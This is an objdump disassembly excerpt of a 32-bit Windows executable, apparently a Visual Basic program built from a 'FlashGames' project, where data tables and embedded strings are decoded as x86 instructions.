  402ba5:	00 00                	add    %al,(%eax)
  402ba7:	0f f8 00             	psubb  (%eax),%mm0
  402baa:	00 00                	add    %al,(%eax)
  402bac:	00 00                	add    %al,(%eax)
  402bae:	00 1f                	add    %bl,(%edi)
  402bb0:	f8                   	clc
  402bb1:	00 00                	add    %al,(%eax)
  402bb3:	00 00                	add    %al,(%eax)
  402bb5:	00 00                	add    %al,(%eax)
  402bb7:	1f                   	pop    %ds
  402bb8:	fc                   	cld
  402bb9:	00 00                	add    %al,(%eax)
  402bbb:	00 00                	add    %al,(%eax)
  402bbd:	00 00                	add    %al,(%eax)
  402bbf:	3f                   	aas
  402bc0:	fc                   	cld
  402bc1:	00 00                	add    %al,(%eax)
  402bc3:	00 00                	add    %al,(%eax)
  402bc5:	00 00                	add    %al,(%eax)
  402bc7:	3f                   	aas
  402bc8:	fe 00                	incb   (%eax)
  402bca:	00 00                	add    %al,(%eax)
  402bcc:	00 00                	add    %al,(%eax)
  402bce:	00 7f ff             	add    %bh,-0x1(%edi)
  402bd1:	80 00 00             	addb   $0x0,(%eax)
  402bd4:	00 00                	add    %al,(%eax)
  402bd6:	01 ff                	add    %edi,%edi
  402bd8:	ff e0                	jmp    *%eax
  402bda:	00 00                	add    %al,(%eax)
  402bdc:	00 00                	add    %al,(%eax)
  402bde:	07                   	pop    %es
  402bdf:	ff                   	(bad)
  402be0:	ff                   	(bad)
  402be1:	ff                   	(bad)
  402be2:	ff                   	(bad)
  402be3:	ff                   	(bad)
  402be4:	ff                   	(bad)
  402be5:	ff                   	(bad)
  402be6:	ff                   	(bad)
  402be7:	ff                   	(bad)
  402be8:	ff                   	(bad)
  402be9:	ff                   	(bad)
  402bea:	ff                   	(bad)
  402beb:	ff                   	(bad)
  402bec:	ff                   	(bad)
  402bed:	ff                   	(bad)
  402bee:	ff                   	(bad)
  402bef:	ff                   	(bad)
  402bf0:	ff                   	(bad)
  402bf1:	ff                   	(bad)
  402bf2:	ff                   	(bad)
  402bf3:	ff                   	(bad)
  402bf4:	ff                   	(bad)
  402bf5:	ff                   	(bad)
  402bf6:	ff                   	(bad)
  402bf7:	ff                   	(bad)
  402bf8:	ff                   	(bad)
  402bf9:	ff                   	(bad)
  402bfa:	ff                   	(bad)
  402bfb:	ff                   	(bad)
  402bfc:	ff                   	(bad)
  402bfd:	ff                   	(bad)
  402bfe:	ff                   	(bad)
  402bff:	ff 24 08             	jmp    *(%eax,%ecx,1)
  402c02:	00 4d 44             	add    %cl,0x44(%ebp)
  402c05:	49                   	dec    %ecx
  402c06:	46                   	inc    %esi
  402c07:	6f                   	outsl  %ds:(%esi),(%dx)
  402c08:	72 6d                	jb     0x402c77
  402c0a:	31 00                	xor    %eax,(%eax)
  402c0c:	35 78 00 00 00       	xor    $0x78,%eax
  402c11:	c2 01 00             	ret    $0x1
  402c14:	00 d0                	add    %dl,%al
  402c16:	11 00                	adc    %eax,(%eax)
  402c18:	00 d6                	add    %dl,%dh
  402c1a:	0b 00                	or     (%eax),%eax
  402c1c:	00 46 03             	add    %al,0x3(%esi)
  402c1f:	ff 04 00             	incl   (%eax,%eax,1)
  402c22:	00 00                	add    %al,(%eax)
  402c24:	07                   	pop    %es
  402c25:	00 00                	add    %al,(%eax)
  402c27:	00 84 3e 40 00 07 00 	add    %al,0x70040(%esi,%edi,1)
  402c2e:	00 00                	add    %al,(%eax)
  402c30:	34 3e                	xor    $0x3e,%al
  402c32:	40                   	inc    %eax
  402c33:	00 07                	add    %al,(%edi)
  402c35:	00 00                	add    %al,(%eax)
  402c37:	00 e0                	add    %ah,%al
  402c39:	3d 40 00 06 00       	cmp    $0x60040,%eax
  402c3e:	00 00                	add    %al,(%eax)
  402c40:	74 35                	je     0x402c77
  402c42:	40                   	inc    %eax
  402c43:	00 01                	add    %al,(%ecx)
  402c45:	00 06                	add    %al,(%esi)
  402c47:	00 18                	add    %bl,(%eax)
  402c49:	32 40 00             	xor    0x0(%eax),%al
  402c4c:	00 00                	add    %al,(%eax)
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	ff                   	(bad)
  402c51:	ff                   	(bad)
  402c52:	ff                   	(bad)
  402c53:	ff                   	(bad)
  402c54:	ff                   	(bad)
  402c55:	ff                   	(bad)
  402c56:	ff                   	(bad)
  402c57:	ff 00                	incl   (%eax)
  402c59:	00 00                	add    %al,(%eax)
  402c5b:	00 8c 33 40 00 6c 70 	add    %cl,0x706c0040(%ebx,%esi,1)
  402c62:	40                   	inc    %eax
  402c63:	00 00                	add    %al,(%eax)
  402c65:	00 00                	add    %al,(%eax)
  402c67:	00 c0                	add    %al,%al
  402c69:	32 a2 00 00 00 00    	xor    0x0(%edx),%ah
	...
  402c77:	00 7c 2c 40          	add    %bh,0x40(%esp,%ebp,1)
  402c7b:	00 01                	add    %al,(%ecx)
  402c7d:	00 01                	add    %al,(%ecx)
  402c7f:	00 18                	add    %bl,(%eax)
  402c81:	32 40 00             	xor    0x0(%eax),%al
  402c84:	00 00                	add    %al,(%eax)
  402c86:	00 00                	add    %al,(%eax)
  402c88:	ff                   	(bad)
  402c89:	ff                   	(bad)
  402c8a:	ff                   	(bad)
  402c8b:	ff                   	(bad)
  402c8c:	ff                   	(bad)
  402c8d:	ff                   	(bad)
  402c8e:	ff                   	(bad)
  402c8f:	ff 00                	incl   (%eax)
  402c91:	00 00                	add    %al,(%eax)
  402c93:	00 9c 32 40 00 2c 70 	add    %bl,0x702c0040(%edx,%esi,1)
  402c9a:	40                   	inc    %eax
  402c9b:	00 00                	add    %al,(%eax)
  402c9d:	00 00                	add    %al,(%eax)
  402c9f:	00 78 af             	add    %bh,-0x51(%eax)
  402ca2:	ac                   	lods   %ds:(%esi),%al
	...
  402caf:	00 b4 2c 40 00 01 00 	add    %dh,0x10040(%esp,%ebp,1)
  402cb6:	04 00                	add    $0x0,%al
  402cb8:	18 32                	sbb    %dh,(%edx)
  402cba:	40                   	inc    %eax
  402cbb:	00 00                	add    %al,(%eax)
  402cbd:	00 00                	add    %al,(%eax)
  402cbf:	00 ff                	add    %bh,%bh
  402cc1:	ff                   	(bad)
  402cc2:	ff                   	(bad)
  402cc3:	ff                   	(bad)
  402cc4:	ff                   	(bad)
  402cc5:	ff                   	(bad)
  402cc6:	ff                   	(bad)
  402cc7:	ff 00                	incl   (%eax)
  402cc9:	00 00                	add    %al,(%eax)
  402ccb:	00 2c 33             	add    %ch,(%ebx,%esi,1)
  402cce:	40                   	inc    %eax
  402ccf:	00 5c 70 40          	add    %bl,0x40(%eax,%esi,2)
  402cd3:	00 00                	add    %al,(%eax)
  402cd5:	00 00                	add    %al,(%eax)
  402cd7:	00 a0 32 a2 00 00    	add    %ah,0xa232(%eax)
	...
  402ce5:	00 00                	add    %al,(%eax)
  402ce7:	00 ec                	add    %ch,%ah
  402ce9:	2c 40                	sub    $0x40,%al
  402ceb:	00 01                	add    %al,(%ecx)
  402ced:	00 03                	add    %al,(%ebx)
  402cef:	00 18                	add    %bl,(%eax)
  402cf1:	32 40 00             	xor    0x0(%eax),%al
  402cf4:	00 00                	add    %al,(%eax)
  402cf6:	00 00                	add    %al,(%eax)
  402cf8:	ff                   	(bad)
  402cf9:	ff                   	(bad)
  402cfa:	ff                   	(bad)
  402cfb:	ff                   	(bad)
  402cfc:	ff                   	(bad)
  402cfd:	ff                   	(bad)
  402cfe:	ff                   	(bad)
  402cff:	ff 00                	incl   (%eax)
  402d01:	00 00                	add    %al,(%eax)
  402d03:	00 fc                	add    %bh,%ah
  402d05:	32 40 00             	xor    0x0(%eax),%al
  402d08:	1c 70                	sbb    $0x70,%al
  402d0a:	40                   	inc    %eax
  402d0b:	00 00                	add    %al,(%eax)
  402d0d:	00 00                	add    %al,(%eax)
  402d0f:	00 28                	add    %ch,(%eax)
  402d11:	45                   	inc    %ebp
  402d12:	94                   	xchg   %eax,%esp
  402d13:	09 00                	or     %eax,(%eax)
	...
  402d1d:	00 00                	add    %al,(%eax)
  402d1f:	00 24 2d 40 00 01 00 	add    %ah,0x10040(,%ebp,1)
  402d26:	05 00 18 32 40       	add    $0x40321800,%eax
  402d2b:	00 00                	add    %al,(%eax)
  402d2d:	00 00                	add    %al,(%eax)
  402d2f:	00 ff                	add    %bh,%bh
  402d31:	ff                   	(bad)
  402d32:	ff                   	(bad)
  402d33:	ff                   	(bad)
  402d34:	ff                   	(bad)
  402d35:	ff                   	(bad)
  402d36:	ff                   	(bad)
  402d37:	ff 00                	incl   (%eax)
  402d39:	00 00                	add    %al,(%eax)
  402d3b:	00 5c 33 40          	add    %bl,0x40(%ebx,%esi,1)
  402d3f:	00 4c 70 40          	add    %cl,0x40(%eax,%esi,2)
  402d43:	00 01                	add    %al,(%ecx)
  402d45:	00 00                	add    %al,(%eax)
  402d47:	00 5c 2d 40          	add    %bl,0x40(%ebp,%ebp,1)
	...
  402d57:	00 5c 2d 40          	add    %bl,0x40(%ebp,%ebp,1)
  402d5b:	00 00                	add    %al,(%eax)
  402d5d:	00 00                	add    %al,(%eax)
  402d5f:	00 01                	add    %al,(%ecx)
  402d61:	00 02                	add    %al,(%edx)
  402d63:	00 18                	add    %bl,(%eax)
  402d65:	32 40 00             	xor    0x0(%eax),%al
  402d68:	00 00                	add    %al,(%eax)
  402d6a:	00 00                	add    %al,(%eax)
  402d6c:	ff                   	(bad)
  402d6d:	ff                   	(bad)
  402d6e:	ff                   	(bad)
  402d6f:	ff                   	(bad)
  402d70:	ff                   	(bad)
  402d71:	ff                   	(bad)
  402d72:	ff                   	(bad)
  402d73:	ff 00                	incl   (%eax)
  402d75:	00 00                	add    %al,(%eax)
  402d77:	00 cc                	add    %cl,%ah
  402d79:	32 40 00             	xor    0x0(%eax),%al
  402d7c:	3c 70                	cmp    $0x70,%al
  402d7e:	40                   	inc    %eax
  402d7f:	00 03                	add    %al,(%ebx)
  402d81:	00 00                	add    %al,(%eax)
  402d83:	00 98 2d 40 00 00    	add    %bl,0x402d(%eax)
	...
  402d91:	00 00                	add    %al,(%eax)
  402d93:	00 98 2d 40 00 40    	add    %bl,0x4000402d(%eax)
  402d99:	00 00                	add    %al,(%eax)
  402d9b:	00 04 00             	add    %al,(%eax,%eax,1)
  402d9e:	00 00                	add    %al,(%eax)
  402da0:	00 00                	add    %al,(%eax)
  402da2:	00 00                	add    %al,(%eax)
  402da4:	50                   	push   %eax
  402da5:	00 00                	add    %al,(%eax)
  402da7:	00 4b 1a             	add    %cl,0x1a(%ebx)
  402daa:	98                   	cwtl
  402dab:	c6                   	(bad)
  402dac:	52                   	push   %edx
  402dad:	71 e2                	jno    0x402d91
  402daf:	4c                   	dec    %esp
  402db0:	9e                   	sahf
  402db1:	eb 83                	jmp    0x402d36
  402db3:	11 a3 e1 47 9c 00    	adc    %esp,0x9c47e1(%ebx)
	...
  402dc9:	00 00                	add    %al,(%eax)
  402dcb:	00 11                	add    %dl,(%ecx)
	...
  402de1:	00 00                	add    %al,(%eax)
  402de3:	00 ed                	add    %ch,%ch
  402de5:	16                   	push   %ss
  402de6:	00 00                	add    %al,(%eax)
  402de8:	00 00                	add    %al,(%eax)
  402dea:	00 00                	add    %al,(%eax)
  402dec:	34 15                	xor    $0x15,%al
  402dee:	40                   	inc    %eax
  402def:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  402df3:	00 56 42             	add    %dl,0x42(%esi)
  402df6:	35 21 f0 00 2a       	xor    $0x2a00f021,%eax
	...
  402e07:	00 7e 00             	add    %bh,0x0(%esi)
	...
  402e16:	0a 00                	or     (%eax),%al
  402e18:	09 04 00             	or     %eax,(%eax,%eax,1)
	...
  402e23:	00 dc                	add    %bl,%ah
  402e25:	2f                   	das
  402e26:	40                   	inc    %eax
  402e27:	00 00                	add    %al,(%eax)
  402e29:	f0 30 00             	lock xor %al,(%eax)
  402e2c:	00 ff                	add    %bh,%bh
  402e2e:	ff                   	(bad)
  402e2f:	ff 08                	decl   (%eax)
  402e31:	00 00                	add    %al,(%eax)
  402e33:	00 01                	add    %al,(%ecx)
  402e35:	00 00                	add    %al,(%eax)
  402e37:	00 01                	add    %al,(%ecx)
  402e39:	00 00                	add    %al,(%eax)
  402e3b:	00 e9                	add    %ch,%cl
  402e3d:	00 00                	add    %al,(%eax)
  402e3f:	00 a4 2d 40 00 24 2c 	add    %ah,0x2c240040(%ebp,%ebp,1)
  402e46:	40                   	inc    %eax
  402e47:	00 f0                	add    %dh,%al
  402e49:	14 40                	adc    $0x40,%al
  402e4b:	00 78 00             	add    %bh,0x0(%eax)
  402e4e:	00 00                	add    %al,(%eax)
  402e50:	82 00 00             	addb   $0x0,(%eax)
  402e53:	00 8c 00 00 00 8d 00 	add    %cl,0x8d0000(%eax,%eax,1)
	...
  402e6a:	00 00                	add    %al,(%eax)
  402e6c:	4f                   	dec    %edi
  402e6d:	6c                   	insb   (%dx),%es:(%edi)
  402e6e:	79 6d                	jns    0x402edd
  402e70:	70 69                	jo     0x402edb
  402e72:	63 53 74             	arpl   %edx,0x74(%ebx)
  402e75:	00 44 65 61          	add    %al,0x61(%ebp,%eiz,2)
  402e79:	6c                   	insb   (%dx),%es:(%edi)
  402e7a:	61                   	popa
  402e7b:	68 6f 79 61 00       	push   $0x61796f
  402e80:	00 44 65 61          	add    %al,0x61(%ebp,%eiz,2)
  402e84:	6c                   	insb   (%dx),%es:(%edi)
  402e85:	61                   	popa
  402e86:	68 6f 79 61 00       	push   $0x61796f
  402e8b:	00 01                	add    %al,(%ecx)
  402e8d:	00 00                	add    %al,(%eax)
  402e8f:	00 18                	add    %bl,(%eax)
  402e91:	32 40 00             	xor    0x0(%eax),%al
  402e94:	00 00                	add    %al,(%eax)
  402e96:	00 00                	add    %al,(%eax)
  402e98:	8c 42 40             	mov    %es,0x40(%edx)
  402e9b:	00 ff                	add    %bh,%bh
  402e9d:	ff                   	(bad)
  402e9e:	ff                   	(bad)
  402e9f:	ff 00                	incl   (%eax)
  402ea1:	00 00                	add    %al,(%eax)
  402ea3:	00 6c 32 40          	add    %ch,0x40(%edx,%esi,1)
  402ea7:	00 08                	add    %cl,(%eax)
  402ea9:	70 40                	jo     0x402eeb
  402eab:	00 00                	add    %al,(%eax)
  402ead:	00 00                	add    %al,(%eax)
  402eaf:	00 80 c3 a5 00 00    	add    %al,0xa5c3(%eax)
	...
  402ebd:	00 00                	add    %al,(%eax)
  402ebf:	00 04 2f             	add    %al,(%edi,%ebp,1)
  402ec2:	40                   	inc    %eax
  402ec3:	00 01                	add    %al,(%ecx)
  402ec5:	00 00                	add    %al,(%eax)
  402ec7:	00 18                	add    %bl,(%eax)
  402ec9:	34 40                	xor    $0x40,%al
  402ecb:	00 00                	add    %al,(%eax)
  402ecd:	00 00                	add    %al,(%eax)
  402ecf:	00 04 2f             	add    %al,(%edi,%ebp,1)
  402ed2:	40                   	inc    %eax
  402ed3:	00 01                	add    %al,(%ecx)
  402ed5:	00 00                	add    %al,(%eax)
  402ed7:	00 0c 2f             	add    %cl,(%edi,%ebp,1)
  402eda:	40                   	inc    %eax
  402edb:	00 00                	add    %al,(%eax)
  402edd:	00 00                	add    %al,(%eax)
  402edf:	00 08                	add    %cl,(%eax)
  402ee1:	2f                   	das
  402ee2:	40                   	inc    %eax
  402ee3:	00 01                	add    %al,(%ecx)
  402ee5:	00 00                	add    %al,(%eax)
  402ee7:	00 0c 2f             	add    %cl,(%edi,%ebp,1)
  402eea:	40                   	inc    %eax
  402eeb:	00 01                	add    %al,(%ecx)
  402eed:	00 b7 01 68 00 6c    	add    %dh,0x6c006801(%edi)
  402ef3:	00 34 2f             	add    %dh,(%edi,%ebp,1)
  402ef6:	40                   	inc    %eax
  402ef7:	00 58 75             	add    %bl,0x75(%eax)
  402efa:	40                   	inc    %eax
  402efb:	00 00                	add    %al,(%eax)
  402efd:	00 00                	add    %al,(%eax)
  402eff:	00 84 03 85 03 28 34 	add    %al,0x34280385(%ebx,%eax,1)
  402f06:	40                   	inc    %eax
  402f07:	00 38                	add    %bh,(%eax)
  402f09:	34 40                	xor    $0x40,%al
  402f0b:	00 40 00             	add    %al,0x0(%eax)
  402f0e:	1f                   	pop    %ds
  402f0f:	00 34 00             	add    %dh,(%eax,%eax,1)
  402f12:	00 00                	add    %al,(%eax)
  402f14:	48                   	dec    %eax
  402f15:	34 40                	xor    $0x40,%al
  402f17:	00 ff                	add    %bh,%bh
  402f19:	ff                   	(bad)
  402f1a:	ff                   	(bad)
  402f1b:	ff 00                	incl   (%eax)
  402f1d:	00 00                	add    %al,(%eax)
  402f1f:	00 00                	add    %al,(%eax)
  402f21:	00 00                	add    %al,(%eax)
  402f23:	00 38                	add    %bh,(%eax)
  402f25:	2f                   	das
  402f26:	40                   	inc    %eax
  402f27:	00 40 07             	add    %al,0x7(%eax)
  402f2a:	85 03                	test   %eax,(%ebx)
  402f2c:	58                   	pop    %eax
  402f2d:	34 40                	xor    $0x40,%al
  402f2f:	00 ff                	add    %bh,%bh
  402f31:	ff                   	(bad)
  402f32:	ff                   	(bad)
  402f33:	ff d4                	call   *%esp
  402f35:	2f                   	das
  402f36:	40                   	inc    %eax
  402f37:	00 00                	add    %al,(%eax)
  402f39:	00 00                	add    %al,(%eax)
  402f3b:	00 0c 2f             	add    %cl,(%edi,%ebp,1)
  402f3e:	40                   	inc    %eax
  402f3f:	00 8c 2e 40 00 ca 14 	add    %cl,0x14ca0040(%esi,%ebp,1)
  402f46:	40                   	inc    %eax
  402f47:	00 d0                	add    %dl,%al
  402f49:	14 40                	adc    $0x40,%al
  402f4b:	00 d6                	add    %dl,%dh
  402f4d:	14 40                	adc    $0x40,%al
	...
  402f67:	00 cc                	add    %cl,%ah
  402f69:	2f                   	das
  402f6a:	40                   	inc    %eax
	...
  402fcb:	00 81 6c 24 04 33    	add    %al,0x3304246c(%ecx)
  402fd1:	00 00                	add    %al,(%eax)
  402fd3:	00 e9                	add    %ch,%cl
  402fd5:	07                   	pop    %es
  402fd6:	13 00                	adc    (%eax),%eax
  402fd8:	00 00                	add    %al,(%eax)
  402fda:	00 00                	add    %al,(%eax)
  402fdc:	f4                   	hlt
  402fdd:	01 00                	add    %eax,(%eax)
  402fdf:	00 18                	add    %bl,(%eax)
  402fe1:	32 40 00             	xor    0x0(%eax),%al
  402fe4:	00 00                	add    %al,(%eax)
  402fe6:	00 00                	add    %al,(%eax)
  402fe8:	d0 42 40             	rolb   $1,0x40(%edx)
  402feb:	00 30                	add    %dh,(%eax)
  402fed:	64 40                	fs inc %eax
  402fef:	00 58 0c             	add    %bl,0xc(%eax)
  402ff2:	00 00                	add    %al,(%eax)
  402ff4:	08 70 40             	or     %dh,0x40(%eax)
  402ff7:	00 66 12             	add    %ah,0x12(%esi)
  402ffa:	40                   	inc    %eax
  402ffb:	00 00                	add    %al,(%eax)
  402ffd:	70 40                	jo     0x40303f
  402fff:	00 2a                	add    %ch,(%edx)
  403001:	00 5c 00 41          	add    %bl,0x41(%eax,%eax,1)
  403005:	00 44 00 3a          	add    %al,0x3a(%eax,%eax,1)
  403009:	00 5c 00 4d          	add    %bl,0x4d(%eax,%eax,1)
  40300d:	00 61 00             	add    %ah,0x0(%ecx)
  403010:	7a 00                	jp     0x403012
  403012:	2d 00 6d 00 69       	sub    $0x69006d00,%eax
  403017:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40301b:	00 63 00             	add    %ah,0x0(%ebx)
  40301e:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  403022:	69 00 63 00 34 00    	imul   $0x340063,(%eax),%eax
  403028:	5c                   	pop    %esp
  403029:	00 46 00             	add    %al,0x0(%esi)
  40302c:	6c                   	insb   (%dx),%es:(%edi)
  40302d:	00 61 00             	add    %ah,0x0(%ecx)
  403030:	73 00                	jae    0x403032
  403032:	68 00 47 00 61       	push   $0x61004700
  403037:	00 6d 00             	add    %ch,0x0(%ebp)
  40303a:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40303e:	2e 00 76 00          	add    %dh,%cs:0x0(%esi)
  403042:	62 00                	bound  %eax,(%eax)
  403044:	70 00                	jo     0x403046
	...
  40320e:	00 00                	add    %al,(%eax)
  403210:	24 2c                	and    $0x2c,%al
  403212:	40                   	inc    %eax
  403213:	00 04 00             	add    %al,(%eax,%eax,1)
  403216:	00 00                	add    %al,(%eax)
  403218:	00 00                	add    %al,(%eax)
  40321a:	00 00                	add    %al,(%eax)
  40321c:	8c 70 40             	mov    %?,0x40(%eax)
  40321f:	00 58 42             	add    %bl,0x42(%eax)
  403222:	40                   	inc    %eax
  403223:	00 ff                	add    %bh,%bh
  403225:	ff                   	(bad)
  403226:	ff                   	(bad)
  403227:	ff 00                	incl   (%eax)
  403229:	00 00                	add    %al,(%eax)
  40322b:	00 7c 70 40          	add    %bh,0x40(%eax,%esi,2)
  40322f:	00 ef                	add    %ch,%bh
  403231:	80 9b ac 29 5e f2 4c 	sbbb   $0x4c,-0xda1d654(%ebx)
  403238:	98                   	cwtl
  403239:	3a d3                	cmp    %bl,%dl
  40323b:	c9                   	leave
  40323c:	f8                   	clc
  40323d:	7e 4a                	jle    0x403289
  40323f:	be 0a 00 07 00       	mov    $0x7000a,%esi
  403244:	07                   	pop    %es
  403245:	00 07                	add    %al,(%edi)
  403247:	00 6c 32 40          	add    %ch,0x40(%edx,%esi,1)
	...
  403257:	00 fc                	add    %bh,%ah
  403259:	33 40 00             	xor    0x0(%eax),%eax
  40325c:	09 04 00             	or     %eax,(%eax,%eax,1)
  40325f:	00 19                	add    %bl,(%ecx)
  403261:	04 00                	add    $0x0,%al
  403263:	00 00                	add    %al,(%eax)
  403265:	00 00                	add    %al,(%eax)
  403267:	00 02                	add    %al,(%edx)
  403269:	00 00                	add    %al,(%eax)
  40326b:	00 8c 2e 40 00 ff ff 	add    %cl,-0xffc0(%esi,%ebp,1)
  403272:	ff                   	(bad)
  403273:	ff                   	lcall  (bad)
  403274:	d8 34 40             	fdivs  (%eax,%eax,2)
	...
  403283:	00 c0                	add    %al,%al
  403285:	33 40 00             	xor    0x0(%eax),%eax
  403288:	01 00                	add    %eax,(%eax)
  40328a:	00 00                	add    %al,(%eax)
  40328c:	bc 33 40 00 ff       	mov    $0xff004033,%esp
  403291:	ff 00                	incl   (%eax)
  403293:	00 83 80 01 00 00    	add    %al,0x180(%ebx)
  403299:	00 00                	add    %al,(%eax)
  40329b:	00 7c 2c 40          	add    %bh,0x40(%esp,%ebp,1)
  40329f:	00 ff                	add    %bh,%bh
  4032a1:	ff                   	(bad)
  4032a2:	ff                   	(bad)
  4032a3:	ff e4                	jmp    *%esp
  4032a5:	34 40                	xor    $0x40,%al
  4032a7:	00 00                	add    %al,(%eax)
  4032a9:	00 00                	add    %al,(%eax)
  4032ab:	00 34 70             	add    %dh,(%eax,%esi,2)
  4032ae:	40                   	inc    %eax
  4032af:	00 00                	add    %al,(%eax)
  4032b1:	00 00                	add    %al,(%eax)
  4032b3:	00 cc                	add    %cl,%ah
  4032b5:	33 40 00             	xor    0x0(%eax),%eax
  4032b8:	10 00                	adc    %al,(%eax)
  4032ba:	00 00                	add    %al,(%eax)
  4032bc:	00 00                	add    %al,(%eax)
  4032be:	00 00                	add    %al,(%eax)
  4032c0:	ff                   	(bad)
  4032c1:	ff 00                	incl   (%eax)
  4032c3:	00 01                	add    %al,(%ecx)
  4032c5:	80 01 00             	addb   $0x0,(%ecx)
  4032c8:	00 00                	add    %al,(%eax)
  4032ca:	00 00                	add    %al,(%eax)
  4032cc:	60                   	pusha
  4032cd:	2d 40 00 ff ff       	sub    $0xffff0040,%eax
  4032d2:	ff                   	(bad)
  4032d3:	ff e4                	jmp    *%esp
  4032d5:	34 40                	xor    $0x40,%al
  4032d7:	00 00                	add    %al,(%eax)
  4032d9:	00 00                	add    %al,(%eax)
  4032db:	00 44 70 40          	add    %al,0x40(%eax,%esi,2)
  4032df:	00 00                	add    %al,(%eax)
  4032e1:	00 00                	add    %al,(%eax)
  4032e3:	00 d4                	add    %dl,%ah
  4032e5:	33 40 00             	xor    0x0(%eax),%eax
  4032e8:	05 00 00 00 00       	add    $0x0,%eax
  4032ed:	00 00                	add    %al,(%eax)
  4032ef:	00 ff                	add    %bh,%bh
  4032f1:	ff 00                	incl   (%eax)
  4032f3:	00 01                	add    %al,(%ecx)
  4032f5:	80 01 00             	addb   $0x0,(%ecx)
  4032f8:	00 00                	add    %al,(%eax)
  4032fa:	00 00                	add    %al,(%eax)
  4032fc:	ec                   	in     (%dx),%al
  4032fd:	2c 40                	sub    $0x40,%al
  4032ff:	00 ff                	add    %bh,%bh
  403301:	ff                   	(bad)
  403302:	ff                   	(bad)
  403303:	ff e4                	jmp    *%esp
  403305:	34 40                	xor    $0x40,%al
  403307:	00 00                	add    %al,(%eax)
  403309:	00 00                	add    %al,(%eax)
  40330b:	00 24 70             	add    %ah,(%eax,%esi,2)
  40330e:	40                   	inc    %eax
  40330f:	00 00                	add    %al,(%eax)
  403311:	00 00                	add    %al,(%eax)
  403313:	00 dc                	add    %bl,%ah
  403315:	33 40 00             	xor    0x0(%eax),%eax
  403318:	03 00                	add    (%eax),%eax
  40331a:	00 00                	add    %al,(%eax)
  40331c:	00 00                	add    %al,(%eax)
  40331e:	00 00                	add    %al,(%eax)
  403320:	ff                   	(bad)
  403321:	ff 00                	incl   (%eax)
  403323:	00 01                	add    %al,(%ecx)
  403325:	80 01 00             	addb   $0x0,(%ecx)
  403328:	00 00                	add    %al,(%eax)
  40332a:	00 00                	add    %al,(%eax)
  40332c:	b4 2c                	mov    $0x2c,%ah
  40332e:	40                   	inc    %eax
  40332f:	00 ff                	add    %bh,%bh
  403331:	ff                   	(bad)
  403332:	ff                   	(bad)
  403333:	ff e4                	jmp    *%esp
  403335:	34 40                	xor    $0x40,%al
  403337:	00 00                	add    %al,(%eax)
  403339:	00 00                	add    %al,(%eax)
  40333b:	00 64 70 40          	add    %ah,0x40(%eax,%esi,2)
  40333f:	00 00                	add    %al,(%eax)
  403341:	00 00                	add    %al,(%eax)
  403343:	00 e4                	add    %ah,%ah
  403345:	33 40 00             	xor    0x0(%eax),%eax
	...
  403350:	ff                   	(bad)
  403351:	ff 00                	incl   (%eax)
  403353:	00 01                	add    %al,(%ecx)
  403355:	80 01 00             	addb   $0x0,(%ecx)
  403358:	00 00                	add    %al,(%eax)
  40335a:	00 00                	add    %al,(%eax)
  40335c:	24 2d                	and    $0x2d,%al
  40335e:	40                   	inc    %eax
  40335f:	00 ff                	add    %bh,%bh
  403361:	ff                   	(bad)
  403362:	ff                   	(bad)
  403363:	ff e4                	jmp    *%esp
  403365:	34 40                	xor    $0x40,%al
  403367:	00 00                	add    %al,(%eax)
  403369:	00 00                	add    %al,(%eax)
  40336b:	00 54 70 40          	add    %dl,0x40(%eax,%esi,2)
  40336f:	00 00                	add    %al,(%eax)
  403371:	00 00                	add    %al,(%eax)
  403373:	00 ec                	add    %ch,%ah
  403375:	33 40 00             	xor    0x0(%eax),%eax
  403378:	02 00                	add    (%eax),%al
  40337a:	00 00                	add    %al,(%eax)
  40337c:	00 00                	add    %al,(%eax)
  40337e:	00 00                	add    %al,(%eax)
  403380:	ff                   	(bad)
  403381:	ff 00                	incl   (%eax)
  403383:	00 01                	add    %al,(%ecx)
  403385:	80 01 00             	addb   $0x0,(%ecx)
  403388:	00 00                	add    %al,(%eax)
  40338a:	00 00                	add    %al,(%eax)
  40338c:	44                   	inc    %esp
  40338d:	2c 40                	sub    $0x40,%al
  40338f:	00 ff                	add    %bh,%bh
  403391:	ff                   	(bad)
  403392:	ff                   	(bad)
  403393:	ff e4                	jmp    *%esp
  403395:	34 40                	xor    $0x40,%al
  403397:	00 00                	add    %al,(%eax)
  403399:	00 00                	add    %al,(%eax)
  40339b:	00 74 70 40          	add    %dh,0x40(%eax,%esi,2)
  40339f:	00 00                	add    %al,(%eax)
  4033a1:	00 00                	add    %al,(%eax)
  4033a3:	00 f4                	add    %dh,%ah
  4033a5:	33 40 00             	xor    0x0(%eax),%eax
	...
  4033b0:	ff                   	(bad)
  4033b1:	ff 00                	incl   (%eax)
  4033b3:	00 01                	add    %al,(%ecx)
  4033b5:	80 01 00             	addb   $0x0,(%ecx)
  4033b8:	00 00                	add    %al,(%eax)
  4033ba:	00 00                	add    %al,(%eax)
  4033bc:	46                   	inc    %esi
  4033bd:	48                   	dec    %eax
  4033be:	6d                   	insl   (%dx),%es:(%edi)
  4033bf:	48                   	dec    %eax
  4033c0:	64 52                	fs push %edx
  4033c2:	65 63 6f 72          	arpl   %ebp,%gs:0x72(%edi)
  4033c6:	6d                   	insl   (%dx),%es:(%edi)
  4033c7:	65 64 00 00          	gs add %al,%fs:(%eax)
  4033cb:	00 73 61             	add    %dh,0x61(%ebx)
  4033ce:	6e                   	outsb  %ds:(%esi),(%dx)
  4033cf:	35 00 00 00 00       	xor    $0x0,%eax
  4033d4:	73 61                	jae    0x403437
  4033d6:	6e                   	outsb  %ds:(%esi),(%dx)
  4033d7:	34 00                	xor    $0x0,%al
  4033d9:	00 00                	add    %al,(%eax)
  4033db:	00 73 61             	add    %dh,0x61(%ebx)
  4033de:	6e                   	outsb  %ds:(%esi),(%dx)
  4033df:	36 00 00             	add    %al,%ss:(%eax)
  4033e2:	00 00                	add    %al,(%eax)
  4033e4:	73 61                	jae    0x403447
  4033e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4033e7:	31 00                	xor    %eax,(%eax)
  4033e9:	00 00                	add    %al,(%eax)
  4033eb:	00 73 61             	add    %dh,0x61(%ebx)
  4033ee:	6e                   	outsb  %ds:(%esi),(%dx)
  4033ef:	33 00                	xor    (%eax),%eax
  4033f1:	00 00                	add    %al,(%eax)
  4033f3:	00 73 61             	add    %dh,0x61(%ebx)
